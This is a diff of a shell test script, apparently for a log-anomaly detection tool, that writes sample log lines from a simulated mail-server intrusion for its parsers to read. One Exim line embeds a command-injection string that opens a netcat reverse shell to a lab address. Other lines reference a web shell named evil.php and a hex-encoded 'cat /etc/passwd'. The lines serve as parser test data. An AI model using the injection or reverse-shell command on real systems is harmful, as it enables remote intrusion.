-#            echo "ntpd[8457]: Listening on routing socket on fd #20 for interface updates" >> $LOG_FILE
-#            echo "ntpd[21152]: logging to file /var/log/ntplog" >> $LOG_FILE
-#            echo "ntpd[22760]: Soliciting pool server 78.41.116.113" >> $LOG_FILE
-#            echo "ntpd[23165]: ntpd 4.2.8p12@1.3728-o (1): Starting" >> $LOG_FILE
-#            echo "ntpd[23165]: Command line: ntpd" >> $LOG_FILE
-#            echo "ntpd[23165]: must be run as root, not uid 1000" >> $LOG_FILE
-#            echo "ntpd[23170]: proto: precision = 0.045 usec (-24)" >> $LOG_FILE
-#            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): good hash signature" >> $LOG_FILE
-#            echo "ntpd[23170]: leapsecond file ('/usr/share/zoneinfo/leap-seconds.list'): loaded, expire=2021-12-28T00:00:00Z last=2017-01-01T00:00:00Z ofs=37" >> $LOG_FILE
-#            echo "ntpd[23170]: unable to bind to wildcard address :: - another process may be running - EXITING" >> $LOG_FILE
-#            ;;
-#        RsyslogParsingModel)
-#            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.4.2\" x-pid=\"1812\" x-info=\"http://www.rsyslog.com\"] rsyslogd was HUPed" > $LOG_FILE
-#            echo "rsyslogd0: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/0 ]" >> $LOG_FILE
-#            echo "rsyslogd-2359: action 'action 17' resumed (module 'builtin:ompipe') [try http://www.rsyslog.com/e/2359 ]" >> $LOG_FILE
-#            echo "rsyslogd-2007: action 'action 17' suspended, next retry is Sun May 24 06:56:28 2015 [try http://www.rsyslog.com/e/2007 ]" >> $LOG_FILE
-#            echo "rsyslogd: rsyslogd's groupid changed to 109" >> $LOG_FILE
-#            echo "rsyslogd: rsyslogd's userid changed to 104" >> $LOG_FILE
-#            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"28018\" x-info=\"https://www.rsyslog.com\"] start" >> $LOG_FILE
-#            echo "rsyslogd: [origin software=\"rsyslogd\" swVersion=\"8.2001.0\" x-pid=\"542\" x-info=\"https://www.rsyslog.com\"] rsyslogd was HUPed" >> $LOG_FILE
-#            echo "rsyslogd-2222: command 'KLogPermitNonKernelFacility' is currently not permitted - did you already set it via a RainerScript command (v6+ config)? [v8.16.0 try http://www.rsyslog.com/e/2222 ]" >> $LOG_FILE
-#            ;;
+        ApacheAccessParsingModel)
+            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
+            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
+            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
+            ;;
+        ApacheErrorParsingModel)
+            echo '[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  Declaration of Horde_Form_Type_pgp::init($gpg, $temp_dir = NULL, $rows = NULL, $cols = NULL) should be compatible with Horde_Form_Type_longtext::init($rows = 8, $cols = 80, $helper = Array) in /usr/share/php/Horde/Form/Type.php on line 878, referer: http://mail.cup.com/nag/' > $LOG_FILE
+            echo "[Sun Mar 01 06:28:15.983231 2020] [:error] [pid 32548] [client 192.168.10.4:55308] PHP Warning:  system(): Cannot execute a blank command in words.php on line 12" > $LOG_FILE
+            echo "[Wed Mar 04 19:32:45.144442 2020] [:error] [pid 8738] [client 192.168.10.238:60488] PHP Notice:  Undefined index: cmd in /var/www/mail.cup.com/static/evil.php on line 1" >> $LOG_FILE
+            echo "[Wed Mar 04 06:26:43.756548 2020] [:error] [pid 22069] [client 192.168.10.190:33604] PHP Deprecated:  Methods with the same name as their class will not be constructors in a future version of PHP; Horde_Form_Variable has a deprecated constructor in /usr/share/php/Horde/Form/Variable.php on line 24, referer: http://mail.cup.com/nag/" >> $LOG_FILE
+            ;;
+        AuditdParsingModel)
+            echo 'type=EXECVE msg=audit(1582934957.620:917519): argc=10 a0="find" a1="/usr/lib/php" a2="-mindepth" a3="1" a4="-maxdepth" a5="1" a6="-regex" a7=".*[0-9]\.[0-9]" a8="-printf" a9="%f\n"' > $LOG_FILE
+            echo 'type=PROCTITLE msg=audit(1582934957.616:917512): proctitle=736F7274002D726E' >> $LOG_FILE
+            echo 'type=SYSCALL msg=audit(1582934957.616:917513): arch=c000003e syscall=2 success=yes exit=3 a0=7f5b904e4988 a1=80000 a2=1 a3=7f5b906ec518 items=1 ppid=25680 pid=25684 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sort" exe="/usr/bin/sort" key=(null)' >> $LOG_FILE
+            echo 'type=PATH msg=audit(1582934957.616:917512): item=0 name="/usr/bin/sort" inode=2883 dev=fe:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL' >> $LOG_FILE
+            echo 'type=LOGIN msg=audit(1582935421.373:947570): pid=25821 uid=0 old-auid=4294967295 auid=0 tty=(none) old-ses=4294967295 ses=22 res=1' >> $LOG_FILE
+            echo "type=SOCKADDR msg=audit(1582935421.377:947594): saddr=01002F6465762F6C6F6700000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000" >> $LOG_FILE
+            echo "type=UNKNOWN[1327] msg=audit(1522927552.749:917): proctitle=636174002F6574632F706173737764" >> $LOG_FILE
+            echo 'type=CRED_REFR msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=USER_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=USER_ACCT msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=USER_AUTH msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=CRED_DISP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=SERVICE_START msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=SERVICE_STOP msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=USER_END msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=USER_CMD msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=CRED_ACQ msg=audit(1583242318.512:13886958): pid=17474 uid=33 auid=4294967295 ses=4294967295 msg=message comm="apache2" terminal="/usr/bin/bash" res=(null)' >> $LOG_FILE
+            echo 'type=BPRM_FCAPS msg=audit(1583242318.512:13886958): fver=17474 fp=33 fi=4294967295 fe=4294967295 old_pp=message old_pi="apache2" old_pe="/usr/bin/bash" new_pp=(null) new_pi=(null) new_pe=(null)' >> $LOG_FILE
+            ;;
+        EximParsingModel)
+            echo "2020-02-29 00:04:25 Start queue run: pid=31912" > $LOG_FILE
+            echo "2020-02-29 00:34:25 End queue run: pid=32425" >> $LOG_FILE
+            echo "2020-03-04 19:17:34 no host name found for IP address 192.168.10.238" >> $LOG_FILE
+            echo "2020-03-04 19:21:48 VRFY failed for boyce@cup.com H=(x) [192.168.10.238]" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi <= trula@mail.cup.com U=www-data P=local S=8714 id=20200304192508.Horde.g3OQpszuommgdrQpHrx6wIc@mail.cup.com" >> $LOG_FILE
+            echo "2020-03-04 19:25:08 1j9Zdk-00029d-Bi => irwin <irwin@mail.cup.com> R=local_user T=mail_spool" >> $LOG_FILE
+            echo '2020-03-04 19:36:19 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop' >> $LOG_FILE
+            echo "2020-03-04 19:36:57 1j9ZpB-0002KN-QF Completed" >> $LOG_FILE
+            echo "2020-03-04 20:04:25 1j9ZoZ-0002Jk-9W Message is frozen" >> $LOG_FILE
+            echo "2020-03-04 19:38:19 1j9ZoZ-0002Jk-9W Frozen (delivery error message)" >> $LOG_FILE
+            ;;
+        SuricataEventParsingModel)
+            echo '{"timestamp":"2020-02-29T00:00:12.734324+0000","flow_id":914989792375924,"in_iface":"eth0","event_type":"dns","src_ip":"192.168.10.154","src_port":53985,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","dns":{"type":"query","id":30266,"rrname":"190.10.168.192.in-addr.arpa","rrtype":"PTR","tx_id":0}}' > $LOG_FILE
+            echo '{"timestamp":"2020-02-29T00:00:14.000538+0000","flow_id":1357371404246463,"event_type":"flow","src_ip":"192.168.10.154","src_port":46289,"dest_ip":"10.18.255.254","dest_port":53,"proto":"UDP","app_proto":"dns","flow":{"pkts_toserver":1,"pkts_toclient":1,"bytes_toserver":87,"bytes_toclient":142,"start":"2020-02-28T23:55:12.974271+0000","end":"2020-02-28T23:55:13.085657+0000","age":1,"state":"established","reason":"timeout","alerted":false}}' >> $LOG_FILE
+            echo '{"timestamp":"2020-02-29T00:00:14.886252+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"http","src_ip":"192.168.10.190","src_port":39438,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":1,"http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326}}' >> $LOG_FILE
+            echo '{"timestamp":"2020-02-29T00:00:14.977952+0000","flow_id":149665274984610,"in_iface":"eth0","event_type":"fileinfo","src_ip":"192.168.10.154","src_port":80,"dest_ip":"192.168.10.190","dest_port":39438,"proto":"TCP","http":{"hostname":"mail.cup.com","url":"\/services\/portal\/","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"GET","protocol":"HTTP\/1.1","status":200,"length":7326},"app_proto":"http","fileinfo":{"filename":"\/services\/portal\/","state":"CLOSED","stored":false,"size":41080,"tx_id":1}}' >> $LOG_FILE
+            echo '{"timestamp":"2020-02-29T00:00:18.000491+0000","event_type":"stats","stats":{"uptime":17705,"capture":{"kernel_packets":337720,"kernel_drops":0},"decoder":{"pkts":337749,"bytes":229373623,"invalid":3062,"ipv4":335528,"ipv6":10,"ethernet":337749,"raw":0,"null":0,"sll":0,"tcp":317611,"udp":14805,"sctp":0,"icmpv4":50,"icmpv6":10,"ppp":0,"pppoe":0,"gre":0,"vlan":0,"vlan_qinq":0,"teredo":0,"ipv4_in_ipv6":0,"ipv6_in_ipv6":0,"mpls":0,"avg_pkt_size":679,"max_pkt_size":1486,"erspan":0,"ipraw":{"invalid_ip_version":0},"ltnull":{"pkt_too_small":0,"unsupported_type":0},"dce":{"pkt_too_small":0}},"flow":{"memcap":0,"spare":10001,"emerg_mode_entered":0,"emerg_mode_over":0,"tcp_reuse":0,"memuse":7104256},"defrag":{"ipv4":{"fragments":0,"reassembled":0,"timeouts":0},"ipv6":{"fragments":0,"reassembled":0,"timeouts":0},"max_frag_hits":0},"tcp":{"sessions":7155,"ssn_memcap_drop":0,"pseudo":1082,"pseudo_failed":0,"invalid_checksum":0,"no_flow":0,"syn":7418,"synack":7307,"rst":3226,"segment_memcap_drop":0,"stream_depth_reached":0,"reassembly_gap":375,"memuse":819200,"reassembly_memuse":12281632},"detect":{"alert":58},"app_layer":{"flow":{"http":4883,"ftp":0,"smtp":0,"tls":1564,"ssh":0,"imap":0,"msn":0,"smb":0,"dcerpc_tcp":0,"dns_tcp":0,"failed_tcp":258,"dcerpc_udp":0,"dns_udp":6951,"failed_udp":119},"tx":{"http":13248,"smtp":0,"tls":0,"dns_tcp":0,"dns_udp":7185}},"flow_mgr":{"closed_pruned":7112,"new_pruned":21,"est_pruned":6999,"bypassed_pruned":0,"flows_checked":1,"flows_notimeout":0,"flows_timeout":1,"flows_timeout_inuse":0,"flows_removed":1,"rows_checked":65536,"rows_skipped":65535,"rows_empty":0,"rows_busy":0,"rows_maxlen":1},"dns":{"memuse":24462,"memcap_state":0,"memcap_global":0},"http":{"memuse":61601,"memcap":0}}}' >> $LOG_FILE
+            echo '{"timestamp":"2020-02-29T00:01:53.976648+0000","flow_id":378741657290945,"in_iface":"eth0","event_type":"tls","src_ip":"192.168.10.238","src_port":53156,"dest_ip":"192.168.10.154","dest_port":443,"proto":"TCP","tls":{"subject":"CN=mail.cup.com","issuerdn":"CN=ChangeMe","fingerprint":"12:7a:88:ea:52:10:62:44:f0:c5:33:8a:28:2d:ad:12:a1:4e:7e:18","sni":"mail.cup.com","version":"TLS 1.2","notbefore":"2020-02-28T18:40:23","notafter":"2030-02-25T18:40:23"}}' >> $LOG_FILE
+            echo '{"timestamp":"2020-02-29T06:11:02.147044+0000","flow_id":415686269975930,"in_iface":"eth0","event_type":"alert","src_ip":"192.168.10.238","src_port":50850,"dest_ip":"192.168.10.154","dest_port":80,"proto":"TCP","tx_id":0,"alert":{"action":"allowed","gid":1,"signature_id":2012887,"rev":3,"signature":"ET POLICY Http Client Body contains pass= in cleartext","category":"Potential Corporate Privacy Violation","severity":1},"http":{"hostname":"mail.cup.com","url":"\/login.php","http_user_agent":"Mozilla\/5.0 (X11; Ubuntu; Linux x86_64; rv:73.0) Gecko\/20100101 Firefox\/73.0","http_content_type":"text\/html","http_refer":"http:\/\/mail.cup.com\/login.php","http_method":"POST","protocol":"HTTP\/1.1","status":302,"redirect":"\/services\/portal\/","length":20}}' >> $LOG_FILE
+            ;;
+        SuricataFastParsingModel)
+            echo "02/29/2020-00:00:13.674931  [**] [1:2012887:3] ET POLICY Http Client Body contains pass= in cleartext [**] [Classification: Potential Corporate Privacy Violation] [Priority: 1] {TCP} 192.168.10.190:39438 -> 192.168.10.154:80" > $LOG_FILE
+            ;;
+        SyslogParsingModel)
+            echo "Feb 29 00:01:41 mail-0 dovecot: imap(kelsey): Logged out in=79 out=875" > $LOG_FILE
+            echo "Mar  1 06:25:38 mail dovecot: imap(lino): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:38]" >> $LOG_FILE
+            echo "Feb 29 00:01:44 mail-0 dovecot: imap(della): Error: file_dotlock_create(/var/mail/della) failed: Permission denied (euid=1013(della) egid=1013(della) missing +w perm: /var/mail, we're not in group 8(mail), dir owned by 0:8 mode=0775) (set mail_privileged_group=mail)" >> $LOG_FILE
+            echo "Mar  1 06:25:41 mail dovecot: imap(idella): Error: Failed to autocreate mailbox INBOX: Internal error occurred. Refer to server log for more information. [2020-03-01 06:25:41]" >> $LOG_FILE
+            echo "Mar  4 14:14:36 mail dovecot: imap-login: Disconnected (auth failed, 2 attempts in 12 secs): user=<violet>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, secured, session=<fEeWCQigUph/AAAB>" >> $LOG_FILE
+            echo "Mar  4 18:43:05 mail dovecot: imap-login: Disconnected (no auth attempts in 0 secs): user=<>, rip=192.168.10.185, lip=192.168.10.177, session=<cjd4ygugaJTAqAq5>" >> $LOG_FILE
+            echo "Mar  4 13:51:48 mail dovecot: imap-login: Disconnected (disconnected before auth was ready, waited 0 secs): user=<>, rip=192.168.10.18, lip=192.168.10.21, session=<+KO9uAeg4sPAqAoS>" >> $LOG_FILE
+            echo "Mar  4 18:43:59 mail dovecot: imap-login: Login: user=<sadye>, method=PLAIN, rip=127.0.0.1, lip=127.0.0.1, mpid=11475, secured, session=<8ZitzQugnrh/AAAB>" >> $LOG_FILE
+            echo "Feb 29 11:39:45 mail-0 dovecot: imap-login: Error: anvil: Anvil queries timed out after 5 secs - aborting queries" >> $LOG_FILE
+            echo "Feb 29 09:15:59 mail-1 dovecot: imap-login: Warning: Auth process not responding, delayed sending initial response (greeting): user=<>, rip=127.0.0.1, lip=127.0.0.1, secured, session=<dVUEZ7OfnLl/AAAB>" >> $LOG_FILE
+            echo "Feb 29 11:39:35 mail-2 dovecot: auth: Error: auth worker: Aborted PASSV request for marjory: Worker process died unexpectedly" >> $LOG_FILE
+            echo "Feb 29 11:39:35 mail-2 dovecot: auth-worker(2233): Fatal: Error reading configuration: Timeout reading config from /var/run/dovecot/config" >> $LOG_FILE
+            echo "Feb 29 11:39:35 mail-2 dovecot: master: Error: service(auth-worker): command startup failed, throttling for 2 secs" >> $LOG_FILE
+            echo 'Feb 29 11:39:46 mail-2 HORDE: [imp] Login success for marjory (192.168.10.18) to {imap://localhost/} [pid 1764 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOG_FILE
+            echo 'Feb 29 17:18:23 mail-2 HORDE: [imp] Message sent to marcelle@mail.insect.com, merlene@mail.insect.com from les (192.168.10.18) [pid 9596 on line 970 of "/var/www/mail.insect.com/imp/lib/Compose.php"]' >> $LOG_FILE
+            echo 'Feb 29 20:01:48 mail-2 HORDE: [imp] FAILED LOGIN for violet (192.168.10.18) to {imap://localhost/} [pid 14794 on line 156 of "/var/www/mail.insect.com/imp/lib/Auth.php"]' >> $LOG_FILE
+            echo 'Mar  1 06:25:38 mail HORDE: [imp] [status] Could not open mailbox "INBOX". [pid 999 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
+            echo 'Mar  1 06:27:56 mail HORDE: [imp] [getSyncToken] IMAP error reported by server. [pid 1127 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
+            echo 'Feb 29 12:12:54 mail-2 HORDE: [horde] Login success for dorie to horde (192.168.10.18) [pid 2272 on line 163 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
+            echo 'Feb 29 12:13:00 mail-2 HORDE: [horde] User marjory logged out of Horde (192.168.10.18) [pid 2988 on line 106 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
+            echo 'Feb 29 17:07:07 mail-2 HORDE: [horde] FAILED LOGIN for marcelle to horde (192.168.10.98) [pid 8517 on line 198 of "/var/www/mail.insect.com/login.php"]' >> $LOG_FILE
+            echo 'Mar  1 18:22:40 mail HORDE: [imp] [login] Authentication failed. [pid 12890 on line 730 of "/var/www/mail.onion.com/imp/lib/Imap.php"]' >> $LOG_FILE
+            echo 'Mar  4 18:55:05 mail HORDE: [turba] PHP ERROR: finfo_file(): Empty filename or path [pid 11642 on line 166 of "/usr/share/php/Horde/Mime/Magic.php"]' >> $LOG_FILE
+            echo 'Mar  4 18:50:51 mail HORDE: [horde] PHP ERROR: Cannot modify header information - headers already sent [pid 11019 on line 0 of "Unknown"]' >> $LOG_FILE
+            echo 'Mar  4 18:01:23 mail HORDE: Guest user is not authorized for Horde (Host: 192.168.10.81). [pid 4815 on line 324 of "/usr/share/php/Horde/Registry.php"]' >> $LOG_FILE
+            echo 'Mar  4 18:10:08 mail HORDE: PHP ERROR: rawurlencode() expects parameter 1 to be string, array given [pid 6556 on line 302 of "/usr/share/php/Horde/Url.php"]' >> $LOG_FILE
+            # missing model/service/horde/horde/free_msg - no log found!
+            echo "Feb 29 12:39:02 mail-0 CRON[11260]: (root) CMD (  [ -x /usr/lib/php/sessionclean ] && if [ ! -d /run/systemd/system ]; then /usr/lib/php/sessionclean; fi)" >> $LOG_FILE
+            echo "Feb 29 06:25:01 mail-1 CRON[27486]: pam_unix(cron:session): session opened for user root by (uid=0)" >> $LOG_FILE
+            echo "Feb 29 15:42:36 mail-1 auth: pam_unix(dovecot:auth): authentication failure; logname= uid=0 euid=0 tty=dovecot ruser=marcelino rhost=127.0.0.1  user=marcelino" >> $LOG_FILE
+            echo "Mar  1 03:09:18 mail-0 systemd[1]: Starting Clean php session files..." >> $LOG_FILE
+            echo "Mar  1 03:09:19 mail-0 systemd[1]: Started Clean php session files." >> $LOG_FILE
+            echo "Mar  1 18:26:18 mail systemd[1]: Starting Cleanup of Temporary Directories..." >> $LOG_FILE
+            echo "Mar  1 18:26:18 mail systemd[1]: Started Cleanup of Temporary Directories." >> $LOG_FILE
+            echo "Mar  2 06:37:52 mail systemd[1]: Starting Daily apt upgrade and clean activities..." >> $LOG_FILE
+            echo "Mar  2 06:37:53 mail systemd[1]: Started Daily apt upgrade and clean activities." >> $LOG_FILE
+            echo "Mar  2 12:30:18 mail systemd[1]: Starting Daily apt download activities..." >> $LOG_FILE
+            echo "Mar  2 12:30:19 mail systemd[1]: Started Daily apt download activities." >> $LOG_FILE
+            echo "Mar  3 06:29:00 mail systemd[1]: Starting Security Auditing Service..." >> $LOG_FILE
+            echo "Mar  3 06:29:00 mail systemd[1]: Started Security Auditing Service." >> $LOG_FILE
+            echo "Mar  4 06:29:05 mail systemd[1]: Stopping Security Auditing Service..." >> $LOG_FILE
+            echo "Mar  4 06:29:05 mail systemd[1]: Stopped Security Auditing Service." >> $LOG_FILE
+            echo "Mar  5 06:25:35 mail systemd[1]: Reloading The Apache HTTP Server." >> $LOG_FILE
+            echo "Mar  5 06:25:35 mail systemd[1]: Reloaded The Apache HTTP Server." >> $LOG_FILE
+            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounting Arbitrary Executable File Formats File System..." >> $LOG_FILE
+            echo "Feb 29 11:52:32 mail-2 systemd[1]: Mounted Arbitrary Executable File Formats File System." >> $LOG_FILE
+            echo "Feb 29 13:56:59 mail-2 systemd[1]: apt-daily.timer: Adding 6h 4min 46.743459s random time." >> $LOG_FILE
+            # missing model/service/systemd/service - no log found!
+            echo "Feb 29 07:24:02 mail-0 kernel: [47678.309129]  [<ffffffff92e1e577>] ? ret_from_fork+0x57/0x70" >> $LOG_FILE
+            echo "Mar  5 06:29:07 mail augenrules[17378]: backlog_wait_time 0" >> $LOG_FILE
+            echo "Mar  5 06:29:07 mail auditd[17377]: dispatch error reporting limit reached - ending report notification." >> $LOG_FILE
+            echo "Mar  5 06:29:07 mail auditd: audit log is not writable by owner" >> $LOG_FILE
+            echo "Mar  4 06:29:05 mail audispd: No plugins found, exiting" >> $LOG_FILE
+            echo 'Mar  3 06:29:01 mail liblogging-stdlog:  [origin software="rsyslogd" swVersion="8.24.0" x-pid="480" x-info="http://www.rsyslog.com"] rsyslogd was HUPed' >> $LOG_FILE
+            echo "Mar  1 09:25:16 mail freshclam[22090]: Sun Mar  1 09:25:16 2020 -> bytecode.cvd is up to date (version: 331, sigs: 94, f-level: 63, builder: anvilleg)" >> $LOG_FILE
+            echo "Mar  1 07:26:09 mail dhclient[418]: DHCPREQUEST of 192.168.10.21 on eth0 to 192.168.10.2 port 67" >> $LOG_FILE
+            echo "Mar  1 00:59:38 mail-2 dhclient[387]: DHCPACK of 192.168.10.21 from 192.168.10.2" >> $LOG_FILE
+            echo "Feb 29 21:12:42 mail-2 dhclient[418]: bound to 192.168.10.21 -- renewal in 36807 seconds." >> $LOG_FILE
+            ;;
+        AminerParsingModel)
+            sudo cp ./demo/aminer/jsonConverterHandler-demo-config.py /tmp/demo-config.py
+            sudo ./demo/aminer/aminerDemo.sh > $LOG_FILE
+            sed -i -e 1,2d $LOG_FILE
+            sed -i -e "/Generating data for the LinearNumericBinDefinition histogram report../d" $LOG_FILE
+            sed -i -e "/Generating data for the ModuloTimeBinDefinition histogram report../d" $LOG_FILE
+            sed -i "/^CPU Temp: /d" $LOG_FILE
+            sed -i "/^first$/d" $LOG_FILE
+            sed -i "/^second$/d" $LOG_FILE
+            sed -i "/^third$/d" $LOG_FILE
+            sed -i "/^fourth$/d" $LOG_FILE
+            cat >> $CONFIG_PATH <<EOL
+        json_format: True
+EOL
+            ;;
+        ApacheAccessModel)
+            echo '83.149.9.216 - - [17/May/2015:10:05:03 +0000] "GET /presentations/logstash-monitorama-2013/images/kibana-search.png HTTP/1.1" 200 203023 "http://semicomplete.com/presentations/logstash-monitorama-2013/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.77 Safari/537.36"' > $LOG_FILE
+            echo '127.0.0.1 - - [01/May/2020:21:44:53 +0200] "GET /phpmyadmin/sql.php?server=1&db=seconlineportaldb&table=CONTRACT&pos=0 HTTP/1.1" 200 5326 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0"' >> $LOG_FILE
+            echo '127.0.0.1 - - [01/Apr/2020:09:19:23 +0200] "GET /phpmyadmin/themes/pmahomme/img/b_drop.png HTTP/1.1" 304 180 "http://localhost/phpmyadmin/phpmyadmin.css.php?nocache=6340393753ltr&server=1" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0"' >> $LOG_FILE
+            echo '111.222.333.123 HOME user1 [01/Feb/1998:01:08:39 -0800] "GET /bannerad/ad.htm HTTP/1.0" 200 198 "http://www.referrer.com/bannerad/ba_intro.htm" "Mozilla/4.01 (Macintosh; I; PPC)"' >> $LOG_FILE
+            echo '::1 - - [31/Mar/2020:15:14:28 +0200] "OPTIONS * HTTP/1.0" 200 126 "-" "Apache/2.4.41 (Ubuntu) OpenSSL/1.1.1c (internal dummy connection)"' >> $LOG_FILE
+            echo '::1 - - [17/May/2015:10:05:03 +0000] "-" 200 203023' >> $LOG_FILE
+            echo '192.168.10.190 - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
+            echo '192.168.10.190 - - [29/Feb/2020:13:58:55 +0000] "POST /nag/task/save.php HTTP/1.1" 200 5220 "-" "-"' >> $LOG_FILE
+            echo 'www.google.com - - [29/Feb/2020:13:58:32 +0000] "GET /services/portal/ HTTP/1.1" 200 7499 "-" "-"' >> $LOG_FILE
+            ;;
+        AudispdParsingModel)
+            echo "audispd: type=ADD_GROUP msg=audit(1525173583.598:2104): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding group acct=\"raman\" exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" > $LOG_FILE
+            echo "audispd: type=ADD_USER msg=audit(1525173583.670:2105): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding user id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOG_FILE
+            echo "audispd: type=ADD_USER msg=audit(1525173583.677:2106): pid=45406 uid=0 auid=0 ses=160 subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 msg='op=adding home directory id=1003 exe=\"/usr/sbin/useradd\" hostname=? addr=? terminal=pts/1 res=success'" >> $LOG_FILE
+            echo 'type=ANOM_ABEND msg=audit(1459467717.181:189187): auid=4294967295 uid=977 gid=2010 ses=4294967295 subj=system_u:system_r:unconfined_service_t:s0 pid=40239 comm="radiusd" reason="memory violation" sig=11' >> $LOG_FILE
+            echo 'audispd: type=ANOM_ABEND msg=audit(1459370041.594:534): auid=10000 uid=0 gid=0 ses=6 subj=system_u:system_r:sshd_t:s0-s0:c0.c1023 pid=3697 comm="sshd" reason="memory violation" sig=6' >> $LOG_FILE
+            echo "audispd: type=ANOM_ACCESS_FS msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_ADD_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_AMTU_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_CRYPTO_FAIL msg=audit(1234567890.123:1234): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_DEL_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_EXEC msg=audit(1222174623.498:608): user pid=12965 uid=1 auid=2 ses=1 msg='op=PAM:unix_chkpwd acct=\"snap\" exe=\"/sbin/unix_chkpwd\" (hostname=?, addr=?, terminal=pts/0 res=failed)'" >> $LOG_FILE
+            echo "audispd: type=ANOM_LOGIN_ACCT msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
+            echo "audispd: type=ANOM_LOGIN_FAILURES msg=audit(1450770603.209:3300446): Text" >> $LOG_FILE
